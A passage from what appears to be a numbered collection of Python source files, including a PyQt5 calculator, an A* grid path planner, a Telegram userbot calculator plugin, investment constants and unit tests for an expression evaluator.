print(number)\n        if debug: print(f'{num_bits = } {hex_val = :b}')\n        calc = number\n\n    return ver_sum, num_bits, hex_val, calc\n\n\ndef part1(input, debug=False):\n    hex_strs = parse(input)\n    for hex_str in hex_strs:\n        print(f'{hex_str = }')\n        hex_val = int(hex_str,16)\n        num_bits = len(hex_str)*4\n\n        ver_sum, num_bits, hex_val, calc = disect(hex_val, num_bits)\n        print(f'Part 1 {input}: {ver_sum = }')\n        print(f'Part 2 {input}: {calc = }')\n\npart1('example.txt')\npart1('input.txt')", "442": "import sys\ntry:\n    from PyQt5.QtWidgets import QApplication,QMainWindow\nexcept:\n    print(\"PyQt5 lib not installed !\")\ntry:\n    from UI import Ui_layoutMAIN\nexcept:\n    print(\"UI class not found !\")\ntry:\n    from tkinter import*\nexcept:\n    print(\"tkinter lib not installed !\")\ntry:\n    import math\nexcept:\n    print('Math lib not installed')\nif __name__ == '__main__':\n    calc_operator = \"\"\n    text_input2 = []\n    app= QApplication(sys.argv)\n    w = QMainWindow()\n    ui = Ui_layoutMAIN()\n    ui.setupUi(w)\n    def Scientific_OP():\n            ui.second_power.setText('x\\u00B2')\n            ui.third_power.setText('x\\u00B3')\n            ui.nth_power.setText('x^n')\n            ui.inv_power.setText('x\\u207b\\xb9')\n            ui.tens_powers.setText('10^x')\n            ui.square_root.setText('\\u00B2\\u221A')\n            ui.third_root.setText('\\u00B3\\u221A')\n            ui.nth_root.setText('\\u221A')\n            ui.log_base10.setText('log\\u2081\\u2080')\n            ui.signs.setText('\\u00B1')\n            ui.abs_value.clicked.connect(lambda: button_click(\"abs(\"))\n            ui.modulo.clicked.connect(lambda: button_click('%'))\n            ui.int_div.clicked.connect(lambda: button_click('//'))\n            ui.factorial_button.clicked.connect(lambda: fact_func())\n            ui.eulers_num.clicked.connect(lambda: button_click(str(math.exp(1))))\n            ui.sine.clicked.connect(lambda: button_click(\"math.sin(\"))\n            ui.cosine.clicked.connect(lambda: button_click(\"math.cos(\"))\n            ui.tangent.clicked.connect(lambda: button_click(\"math.tan(\"))\n            ui.cotangent.clicked.connect(lambda: button_click(\"1/math.tan(\"))\n            ui.pi_num.clicked.connect(lambda: button_click(str(math.pi)))\n            ui.third_power.clicked.connect(lambda: button_click(\"**3\"))\n            ui.nth_power.clicked.connect(lambda: button_click(\"**\"))\n            ui.inv_power.clicked.connect(lambda: button_click(\"**(-1)\"))\n            ui.tens_powers.clicked.connect(lambda: button_click(\"10**\"))\n            ui.left_par.clicked.connect(lambda: button_click(\"(\"))\n            ui.right_par.clicked.connect(lambda: button_click(\")\"))\n            ui.signs.clicked.connect(lambda: sign_change())\n            ui.percentage.clicked.connect(lambda: percent())\n            ui.ex.clicked.connect(lambda: button_click(\"e(\"))\n            ui.square_root.clicked.connect(lambda: square_root())\n            ui.third_root.clicked.connect(lambda: third_root())\n            ui.nth_root.clicked.connect(lambda: button_click(\"**(1/\"))\n            ui.log_base10.clicked.connect(lambda: button_click(\"log(\"))\n            ui.log_basee.clicked.connect(lambda: button_click(\"ln(\"))\n    Scientific_OP()\n    ui.button_1.clicked.connect(lambda : button_click(\"1\"))\n    ui.button_2.clicked.connect(lambda: button_click(\"2\"))\n    ui.button_3.clicked.connect(lambda: button_click(\"3\"))\n    ui.button_4.clicked.connect(lambda: button_click(\"4\"))\n    ui.button_5.clicked.connect(lambda: button_click(\"5\"))\n    ui.button_6.clicked.connect(lambda: button_click(\"6\"))\n    ui.button_7.clicked.connect(lambda: button_click(\"7\"))\n    ui.button_8.clicked.connect(lambda: button_click(\"8\"))\n    ui.button_9.clicked.connect(lambda: button_click(\"9\"))\n    ui.button_0.clicked.connect(lambda: button_click(\"0\"))\n    ui.add.clicked.connect(lambda: button_click(\"+\"))\n    ui.sub.clicked.connect(lambda: button_click(\"-\"))\n    ui.div.clicked.connect(lambda: button_click(\"/\"))\n    ui.mul.clicked.connect(lambda: button_click(\"*\"))\n    ui.point.clicked.connect(lambda: button_click(\".\"))\n    ui.exp.clicked.connect(lambda: button_click(E))\n    ui.equal.clicked.connect(lambda: button_equal())\n    ui.delete_all.clicked.connect(lambda :button_clear_all())\n    ui.delete_one.clicked.connect(lambda : button_delete())\n    w.show()\n    def text_input():\n        h=text_input2\n        for ele in text_input2:\n            h +=ele\n        return h\n    def labelRe(value):\n            t=\"\"\n            for ele in value:\n                t += ele\n            t = t.replace('math.sin(','sin(').replace('math.tan(','tan(').replace('math.cos(','cos(').replace('1/tan(','cot(')\n            t = t.replace('/', '\u00f7')\n            t = t.replace('3.141592653589793','\u03c0')\n            t = t.replace(\"**2\",'\\u00B2').replace('**3','\\u00B3')\n            t = t.replace(\"**\",'^')\n            ui.text_display.setText(t.replace(\"*10**\", \"E\").replace('*', '\u00d7'))\n    def button_click(char):\n        global calc_operator\n        calc_operator += str(char)\n        text_input2.clear()\n        text_input2.append(calc_operator)\n        labelRe(text_input2)\n    def button_clear_all():\n        global calc_operator\n        calc_operator = \"\"\n        text_input2.clear()\n        labelRe(text_input2)\n    def button_delete():\n        global calc_operator\n        text = calc_operator[:-1]\n        calc_operator = text\n        text_input2.clear()\n        text_input2.append(calc_operator)\n        labelRe(calc_operator)\n    def factorial(n):\n        try:\n            if n == 0 or n == 1:\n                return 1\n            else:\n                return n * factorial(n - 1)\n        except:\n            labelRe(\"Oops!\")\n    def fact_func():\n        try:\n            global calc_operator\n            result = str(factorial(int(calc_operator)))\n            calc_operator = result\n            text_input2.clear()\n            text_input2.append(result)\n            labelRe(result)\n        except:\n            labelRe(\"Bad expression\")\n    def trig_sin():\n        try:\n            global calc_operator\n            result = str(math.sin(math.radians(int(calc_operator))))\n            calc_operator = result\n            text_input2.clear()\n            text_input2.append(result)\n            labelRe(text_input2)\n        except:\n            labelRe(\"Bad expression\")\n    def trig_cos():\n        try:\n            global calc_operator\n            result = str(math.cos(math.radians(int(calc_operator))))\n            calc_operator = result\n            text_input2.clear()\n            text_input2.append(result)\n            labelRe(text_input2)\n        except:\n            labelRe(\"Bad expression\")\n    def trig_tan():\n        try:\n            global calc_operator\n            result = str(math.tan(math.radians(int(calc_operator))))\n            calc_operator = result\n            text_input2.clear()\n            text_input2.append(result)\n            labelRe(text_input2)\n        except:\n            labelRe(\"Bad expression\")\n    def trig_cot():\n        try:\n            global calc_operator\n            result = str(1 / math.tan(math.radians(int(calc_operator))))\n            calc_operator = result\n            text_input2.clear()\n            text_input2.append(result)\n            labelRe(text_input2)\n        except:\n            labelRe(\"Bad expression\")\n    def square_root():\n        try:\n            global calc_operator\n            temp = str(eval(calc_operator + '**(1/2)'))\n            calc_operator = temp\n            text_input2.clear()\n            text_input2.append(temp)\n            labelRe(text_input2)\n        except:\n            labelRe(\"Bad expression\")\n    def third_root():\n        try:\n            global calc_operator\n            temp = str(eval(calc_operator + '**(1/3)'))\n            calc_operator = temp\n            text_input2.clear()\n            text_input2.append(temp)\n            labelRe(text_input2)\n        except:\n            labelRe(\"Bad expression\")\n    def sign_change():\n        try:\n            global calc_operator\n            if calc_operator[0] == '-':\n                temp = calc_operator[1:]\n            else:\n                temp = '-' + calc_operator\n            calc_operator = temp\n            text_input2.clear()\n            text_input2.append(temp)\n            labelRe(text_input2)\n        except:\n            labelRe(\"Bad expression\")\n    def percent():\n        try:\n            global calc_operator\n            temp = str(eval(calc_operator + '/100'))\n            calc_operator = temp\n            text_input2.clear()\n            text_input2.append(temp)\n            labelRe(text_input2)\n        except:\n            labelRe(\"Bad expression\")\n    def button_equal():\n        if text_input2==[]:\n            text_input2.clear()\n            labelRe(text_input2)\n        else:\n            global calc_operator\n            try:\n                temp_op = str(eval(calc_operator))\n                text_input2.clear()\n                text_input2.append(temp_op)\n                labelRe(text_input2)\n                calc_operator = temp_op\n            except:\n                labelRe(\"Bad expression\")\n    sys.exit(app.exec_())\n", "443": "\"\"\"\n\nA* grid planning\n\nauthor: Atsushi Sakai(@Atsushi_twi)\n        Nikos Kanargias (nkana@tee.gr)\n\nSee Wikipedia article (https://en.wikipedia.org/wiki/A*_search_algorithm)\n\n\"\"\"\n\nimport math\n\nimport matplotlib.pyplot as plt\n\nshow_animation = True\n\n\nclass AStarPlanner:\n\n    def __init__(self, ox, oy, resolution, rr):\n        \"\"\"\n        Initialize grid map for a star planning\n\n        ox: x position list of Obstacles [m]\n        oy: y position list of Obstacles [m]\n        resolution: grid resolution [m]\n        rr: robot radius[m]\n        \"\"\"\n\n        self.resolution = resolution\n        self.rr = rr\n        self.min_x, self.min_y = 0, 0\n        self.max_x, self.max_y = 0, 0\n        self.obstacle_map = None\n        self.x_width, self.y_width = 0, 0\n        self.motion = self.get_motion_model()\n        self.calc_obstacle_map(ox, oy)\n\n    class Node:\n        def __init__(self, x, y, cost, parent_index):\n            self.x = x  # index of grid\n            self.y = y  # index of grid\n            self.cost = cost\n            self.parent_index = parent_index\n\n        def __str__(self):\n            return str(self.x) + \",\" + str(self.y) + \",\" + str(\n                self.cost) + \",\" + str(self.parent_index)\n\n    def planning(self, sx, sy, gx, gy):\n        \"\"\"\n        A star path search\n\n        input:\n            s_x: start x position [m]\n            s_y: start y position [m]\n            gx: goal x position [m]\n            gy: goal y position [m]\n\n        output:\n            rx: x position list of the final path\n            ry: y position list of the final path\n        \"\"\"\n\n        start_node = self.Node(self.calc_xy_index(sx, self.min_x),\n                               self.calc_xy_index(sy, self.min_y), 0.0, -1)\n        goal_node = self.Node(self.calc_xy_index(gx, self.min_x),\n                              self.calc_xy_index(gy, self.min_y), 0.0, -1)\n\n        open_set, closed_set = dict(), dict()\n        open_set[self.calc_grid_index(start_node)] = start_node\n\n        while 1:\n            if len(open_set) == 0:\n                print(\"Open set is empty..\")\n                break\n\n            c_id = min(\n                open_set,\n                key=lambda o: open_set[o].cost + self.calc_heuristic(goal_node,\n                                                                     open_set[\n                                                                         o]))\n            current = open_set[c_id]\n\n            # show graph\n            if show_animation:  # pragma: no cover\n                plt.plot(self.calc_grid_position(current.x, self.min_x),\n                         self.calc_grid_position(current.y, self.min_y), \"xc\")\n                # for stopping simulation with the esc key.\n                plt.gcf().canvas.mpl_connect('key_release_event',\n                                             lambda event: [exit(\n                                                 0) if event.key == 'escape' else None])\n                if len(closed_set.keys()) % 10 == 0:\n                    plt.pause(0.001)\n\n            if current.x == goal_node.x and current.y == goal_node.y:\n                print(\"Find goal\")\n                goal_node.parent_index = current.parent_index\n                goal_node.cost = current.cost\n                break\n\n            # Remove the item from the open set\n            del open_set[c_id]\n\n            # Add it to the closed set\n            closed_set[c_id] = current\n\n            # expand_grid search grid based on motion model\n            for i, _ in enumerate(self.motion):\n                node = self.Node(current.x + self.motion[i][0],\n                                 current.y + self.motion[i][1],\n                                 current.cost + self.motion[i][2], c_id)\n                n_id = self.calc_grid_index(node)\n\n                # If the node is not safe, do nothing\n                if not self.verify_node(node):\n                    continue\n\n                if n_id in closed_set:\n                    continue\n\n                if n_id not in open_set:\n                    open_set[n_id] = node  # discovered a new node\n                else:\n                    if open_set[n_id].cost > node.cost:\n                        # This path is the best until now. record it\n                        open_set[n_id] = node\n\n        rx, ry = self.calc_final_path(goal_node, closed_set)\n\n        return rx, ry\n\n    def calc_final_path(self, goal_node, closed_set):\n        # generate final course\n        rx, ry = [self.calc_grid_position(goal_node.x, self.min_x)], [\n            self.calc_grid_position(goal_node.y, self.min_y)]\n        parent_index = goal_node.parent_index\n        while parent_index != -1:\n            n = closed_set[parent_index]\n            rx.append(self.calc_grid_position(n.x, self.min_x))\n            ry.append(self.calc_grid_position(n.y, self.min_y))\n            parent_index = n.parent_index\n\n        return rx, ry\n\n    @staticmethod\n    def calc_heuristic(n1, n2):\n        w = 1.0  # weight of heuristic\n        d = w * math.hypot(n1.x - n2.x, n1.y - n2.y)\n        return d\n\n    def calc_grid_position(self, index, min_position):\n        \"\"\"\n        calc grid position\n\n        :param index:\n        :param min_position:\n        :return:\n        \"\"\"\n        pos = index * self.resolution + min_position\n        return pos\n\n    def calc_xy_index(self, position, min_pos):\n        return round((position - min_pos) / self.resolution)\n\n    def calc_grid_index(self, node):\n        return (node.y - self.min_y) * self.x_width + (node.x - self.min_x)\n\n    def verify_node(self, node):\n        px = self.calc_grid_position(node.x, self.min_x)\n        py = self.calc_grid_position(node.y, self.min_y)\n\n        if px < self.min_x:\n            return False\n        elif py < self.min_y:\n            return False\n        elif px >= self.max_x:\n            return False\n        elif py >= self.max_y:\n            return False\n\n        # collision check\n        if self.obstacle_map[node.x][node.y]:\n            return False\n\n        return True\n\n    def calc_obstacle_map(self, ox, oy):\n\n        self.min_x = round(min(ox))\n        self.min_y = round(min(oy))\n        self.max_x = round(max(ox))\n        self.max_y = round(max(oy))\n        print(\"min_x:\", self.min_x)\n        print(\"min_y:\", self.min_y)\n        print(\"max_x:\", self.max_x)\n        print(\"max_y:\", self.max_y)\n\n        self.x_width = round((self.max_x - self.min_x) / self.resolution)\n        self.y_width = round((self.max_y - self.min_y) / self.resolution)\n        print(\"x_width:\", self.x_width)\n        print(\"y_width:\", self.y_width)\n\n        # obstacle map generation\n        self.obstacle_map = [[False for _ in range(self.y_width)]\n                             for _ in range(self.x_width)]\n        for ix in range(self.x_width):\n            x = self.calc_grid_position(ix, self.min_x)\n            for iy in range(self.y_width):\n                y = self.calc_grid_position(iy, self.min_y)\n                for iox, ioy in zip(ox, oy):\n                    d = math.hypot(iox - x, ioy - y)\n                    if d <= self.rr:\n                        self.obstacle_map[ix][iy] = True\n                        break\n\n    @staticmethod\n    def get_motion_model():\n        # dx, dy, cost\n        motion = [[1, 0, 1],\n                  [0, 1, 1],\n                  [-1, 0, 1],\n                  [0, -1, 1],\n                  [-1, -1, math.sqrt(2)],\n                  [-1, 1, math.sqrt(2)],\n                  [1, -1, math.sqrt(2)],\n                  [1, 1, math.sqrt(2)]]\n\n        return motion\n\n\ndef main():\n    print(__file__ + \" start!!\")\n\n    # start and goal position\n    sx = 10.0  # [m]\n    sy = 10.0  # [m]\n    gx = 50.0  # [m]\n    gy = 50.0  # [m]\n    grid_size = 2.0  # [m]\n    robot_radius = 1.0  # [m]\n\n    # set obstacle positions\n    ox, oy = [], []\n    for i in range(-10, 60):\n        ox.append(i)\n        oy.append(-10.0)\n    for i in range(-10, 60):\n        ox.append(60.0)\n        oy.append(i)\n    for i in range(-10, 61):\n        ox.append(i)\n        oy.append(60.0)\n    for i in range(-10, 61):\n        ox.append(-10.0)\n        oy.append(i)\n    for i in range(-10, 40):\n        ox.append(20.0)\n        oy.append(i)\n    for i in range(0, 40):\n        ox.append(40.0)\n        oy.append(60.0 - i)\n\n    if show_animation:  # pragma: no cover\n        plt.plot(ox, oy, \".k\")\n        plt.plot(sx, sy, \"og\")\n        plt.plot(gx, gy, \"xb\")\n        plt.grid(True)\n        plt.axis(\"equal\")\n\n    a_star = AStarPlanner(ox, oy, grid_size, robot_radius)\n    rx, ry = a_star.planning(sx, sy, gx, gy)\n\n    if show_animation:  # pragma: no cover\n        plt.plot(rx, ry, \"-r\")\n        plt.pause(0.001)\n        plt.show()\n\n\nif __name__ == '__main__':\n    main()\n", "444": "import os\nimport json\n\nclass _constBase:\n    class ConstError(TypeError): pass\n\n    def __setattr__(self, name, value):\n        if name in self.__dict__:\n            raise self.ConstError(\"Can't rebind const (%s)\" % name)\n        self.__dict__[name] = value\n\nclass GlobalConst:\n    FILE_NAME_ORIGIN_DATA_HELPER_JSON = r\"..\\data\\invest\\OriginDataHelper.json\"\n    FILE_NAME_ORIGIN_DATA_JSON = r\"..\\data\\invest\\OriginData.json\"\n\n    @staticmethod\n    def currentDirFileName(fileName):\n        currentDir = os.path.dirname(os.path.realpath(__file__))\n        return currentDir + '\\\\' + fileName\n\n    # FCN, \u80a1\u7968, \u6307\u6570, \u516c\u52df\u57fa\u91d1, \u79c1\u52df\u57fa\u91d1, \u79c1\u52df\u80a1\u6743, \u503a\u5238, \u501f\u6b3e, \u56fa\u6536\u7c7b, \u5176\u5b83\n    CALC_INVEST_TYPE_FCN = 1\n    CALC_INVEST_TYPE_STOCK = 2\n    CALC_INVEST_TYPE_INDEX = 3\n    CALC_INVEST_TYPE_PUBLIC_FUND = 4\n    CALC_INVEST_TYPE_PRIVATE_FUND = 5\n    CALC_INVEST_TYPE_PRIVATE_EQUITY = 6\n    CALC_INVEST_TYPE_BOND = 7\n    CALC_INVEST_TYPE_LOAN = 8\n    CALC_INVEST_TYPE_FIXED_INCOME = 9\n    CALC_INVEST_TYPE_OTHER = 10\n    CalcInvestType = {\n        CALC_INVEST_TYPE_FCN : \"FCN\",\n        CALC_INVEST_TYPE_STOCK : \"\u80a1\u7968\",\n        CALC_INVEST_TYPE_INDEX : \"\u6307\u6570\",\n        CALC_INVEST_TYPE_PUBLIC_FUND : \"\u516c\u52df\u57fa\u91d1\",\n        CALC_INVEST_TYPE_PRIVATE_FUND : \"\u79c1\u52df\u57fa\u91d1\",\n        CALC_INVEST_TYPE_PRIVATE_EQUITY : \"\u79c1\u52df\u80a1\u6743\",\n        CALC_INVEST_TYPE_BOND : \"\u503a\u5238\",\n        CALC_INVEST_TYPE_LOAN : \"\u501f\u6b3e\",\n        CALC_INVEST_TYPE_FIXED_INCOME : \"\u56fa\u6536\u7c7b\",\n        CALC_INVEST_TYPE_OTHER : \"\u5176\u5b83\",\n    }\n\nclass GlobalTools:\n    @staticmethod\n    def convertExchangeRate():\n        # =VLOOKUP(D2, M2: N5, 2, 0)\n        for i in range(2, 300):\n            print(\"=VLOOKUP(D{0}, M2: N5, 2, 0)\".format(i))\n\nclass JsonTools:\n    @staticmethod\n    def dictGetDataByKey(dictData, key):\n        if JsonTools.hasKey(dictData, key):\n            return dictData[key]\n        return None\n\n    @staticmethod\n    def hasKey(dictData, key):\n        for k in dictData:\n            if k == key:\n                return True\n        return False\n\n    @staticmethod\n    def writeJson(filename, jsonData, mode = \"w\"):\n        print(\"Writing Json:\" + filename)\n\n        with open(filename, mode,  encoding = 'utf-8') as file_obj:\n            json.dump(jsonData, file_obj, ensure_ascii=False)\n        print(\"Finish Writing!\")\n\n    @staticmethod\n    def readAsJson(filename):\n        with open(filename, 'r',  encoding = 'utf-8') as file_obj:\n            jsonData = json.load(file_obj)\n        return jsonData\n", "445": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "446": "\"\"\"\nUnit tests for calc.py\n\"\"\"\n\nimport unittest\nimport numpy\nimport calc\nfrom pyparsing import ParseException\n\n# numpy's default behavior when it evaluates a function outside its domain\n# is to raise a warning (not an exception) which is then printed to STDOUT.\n# To prevent this from polluting the output of the tests, configure numpy to\n# ignore it instead.\n# See http://docs.scipy.org/doc/numpy/reference/generated/numpy.seterr.html\nnumpy.seterr(all='ignore')  # Also: 'ignore', 'warn' (default), 'raise'\n\n\nclass EvaluatorTest(unittest.TestCase):\n    \"\"\"\n    Run tests for calc.evaluator\n    Go through all functionalities as specifically as possible--\n    work from number input to functions and complex expressions\n    Also test custom variable substitutions (i.e.\n      `evaluator({'x':3.0}, {}, '3*x')`\n    gives 9.0) and more.\n    \"\"\"\n\n    def test_number_input(self):\n        \"\"\"\n        Test different kinds of float inputs\n\n        See also\n          test_trailing_period (slightly different)\n          test_exponential_answer\n          test_si_suffix\n        \"\"\"\n        easy_eval = lambda x: calc.evaluator({}, {}, x)\n\n        self.assertEqual(easy_eval(\"13\"), 13)\n        self.assertEqual(easy_eval(\"3.14\"), 3.14)\n        self.assertEqual(easy_eval(\".618033989\"), 0.618033989)\n\n        self.assertEqual(easy_eval(\"-13\"), -13)\n        self.assertEqual(easy_eval(\"-3.14\"), -3.14)\n        self.assertEqual(easy_eval(\"-.618033989\"), -0.618033989)\n\n    def test_period(self):\n        \"\"\"\n        The string '.' should not evaluate to anything.\n        \"\"\"\n        with self.assertRaises(ParseException):\n            calc.evaluator({}, {}, '.')\n        with self.assertRaises(ParseException):\n            calc.evaluator({}, {}, '1+.')\n\n    def test_trailing_period(self):\n        \"\"\"\n        Test that things like '4.' will be 4 and not throw an error\n        \"\"\"\n        self.assertEqual(4.0, calc.evaluator({}, {}, '4.'))\n\n    def test_exponential_answer(self):\n        \"\"\"\n        Test for correct interpretation of scientific notation\n        \"\"\"\n        answer = 50\n        correct_responses = [\n            \"50\", \"50.0\", \"5e1\", \"5e+1\",\n            \"50e0\", \"50.0e0\", \"500e-1\"\n        ]\n        incorrect_responses = [\"\", \"3.9\", \"4.1\", \"0\", \"5.01e1\"]\n\n        for input_str in correct_responses:\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Expected '{0}' to equal {1}\".format(\n                input_str, answer\n            )\n            self.assertEqual(answer, result, msg=fail_msg)\n\n        for input_str in incorrect_responses:\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Expected '{0}' to not equal {1}\".format(\n                input_str, answer\n            )\n            self.assertNotEqual(answer, result, msg=fail_msg)\n\n    def test_si_suffix(self):\n        \"\"\"\n        Test calc.py's unique functionality of interpreting si 'suffixes'.\n\n        For instance 'k' stand for 'kilo-' so '1k' should be 1,000\n        \"\"\"\n        test_mapping = [\n            ('4.2%', 0.042), ('2.25k', 2250), ('8.3M', 8300000),\n            ('9.9G', 9.9e9), ('1.2T', 1.2e12), ('7.4c', 0.074),\n            ('5.4m', 0.0054), ('8.7u', 0.0000087),\n            ('5.6n', 5.6e-9), ('4.2p', 4.2e-12)\n        ]\n\n        for (expr, answer) in test_mapping:\n            tolerance = answer * 1e-6  # Make rel. tolerance, because of floats\n            fail_msg = \"Failure in testing suffix '{0}': '{1}' was not {2}\"\n            fail_msg = fail_msg.format(expr[-1], expr, answer)\n            self.assertAlmostEqual(\n                calc.evaluator({}, {}, expr), answer,\n                delta=tolerance, msg=fail_msg\n            )\n\n    def test_operator_sanity(self):\n        \"\"\"\n        Test for simple things like '5+2' and '5/2'\n        \"\"\"\n        var1 = 5.0\n        var2 = 2.0\n        operators = [('+', 7), ('-', 3), ('*', 10), ('/', 2.5), ('^', 25)]\n\n        for (operator, answer) in operators:\n            input_str = \"{0} {1} {2}\".format(var1, operator, var2)\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Failed on operator '{0}': '{1}' was not {2}\".format(\n                operator, input_str, answer\n            )\n            self.assertEqual(answer, result, msg=fail_msg)\n\n    def test_raises_zero_division_err(self):\n        \"\"\"\n        Ensure division by zero gives an error\n        \"\"\"\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({}, {}, '1/0')\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({}, {}, '1/0.0')\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({'x': 0.0}, {}, '1/x')\n\n    def test_parallel_resistors(self):\n        \"\"\"\n        Test the parallel resistor operator ||\n\n        The formula is given by\n            a || b || c ...\n            = 1 / (1/a + 1/b + 1/c + ...)\n        It is the resistance of a parallel circuit of resistors with resistance\n        a, b, c, etc&. See if this evaulates correctly.\n        \"\"\"\n        self.assertEqual(calc.evaluator({}, {}, '1||1'), 0.5)\n        self.assertEqual(calc.evaluator({}, {}, '1||1||2'), 0.4)\n        self.assertEqual(calc.evaluator({}, {}, \"j||1\"), 0.5 + 0.5j)\n\n    def test_parallel_resistors_with_zero(self):\n        \"\"\"\n        Check the behavior of the || operator with 0\n        \"\"\"\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, '0||1')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, '0.0||1')))\n        self.assertTrue(numpy.isnan(calc.evaluator({'x': 0.0}, {}, 'x||1')))\n\n    def assert_function_values(self, fname, ins, outs, tolerance=1e-3):\n        \"\"\"\n        Helper function to test many values at once\n\n        Test the accuracy of evaluator's use of the function given by fname\n        Specifically, the equality of `fname(ins[i])` against outs[i].\n        This is used later to test a whole bunch of f(x) = y at a time\n        \"\"\"\n\n        for (arg, val) in zip(ins, outs):\n            input_str = \"{0}({1})\".format(fname, arg)\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Failed on function {0}: '{1}' was not {2}\".format(\n                fname, input_str, val\n            )\n            self.assertAlmostEqual(val, result, delta=tolerance, msg=fail_msg)\n\n    def test_trig_functions(self):\n        \"\"\"\n        Test the trig functions provided in calc.py\n\n        which are: sin, cos, tan, arccos, arcsin, arctan\n        \"\"\"\n\n        angles = ['-pi/4', '0', 'pi/6', 'pi/5', '5*pi/4', '9*pi/4', '1 + j']\n        sin_values = [-0.707, 0, 0.5, 0.588, -0.707, 0.707, 1.298 + 0.635j]\n        cos_values = [0.707, 1, 0.866, 0.809, -0.707, 0.707, 0.834 - 0.989j]\n        tan_values = [-1, 0, 0.577, 0.727, 1, 1, 0.272 + 1.084j]\n        # Cannot test tan(pi/2) b/c pi/2 is a float and not precise...\n\n        self.assert_function_values('sin', angles, sin_values)\n        self.assert_function_values('cos', angles, cos_values)\n        self.assert_function_values('tan', angles, tan_values)\n\n        # Include those where the real part is between -pi/2 and pi/2\n        arcsin_inputs = ['-0.707', '0', '0.5', '0.588', '1.298 + 0.635*j']\n        arcsin_angles = [-0.785, 0, 0.524, 0.629, 1 + 1j]\n        self.assert_function_values('arcsin', arcsin_inputs, arcsin_angles)\n        # Rather than a complex number, numpy.arcsin gives nan\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arcsin(-1.1)')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arcsin(1.1)')))\n\n        # Include those where the real part is between 0 and pi\n        arccos_inputs = ['1', '0.866', '0.809', '0.834-0.989*j']\n        arccos_angles = [0, 0.524, 0.628, 1 + 1j]\n        self.assert_function_values('arccos', arccos_inputs, arccos_angles)\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arccos(-1.1)')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arccos(1.1)')))\n\n        # Has the same range as arcsin\n        arctan_inputs = ['-1', '0', '0.577', '0.727', '0.272 + 1.084*j']\n        arctan_angles = arcsin_angles\n        self.assert_function_values('arctan', arctan_inputs, arctan_angles)\n\n    def 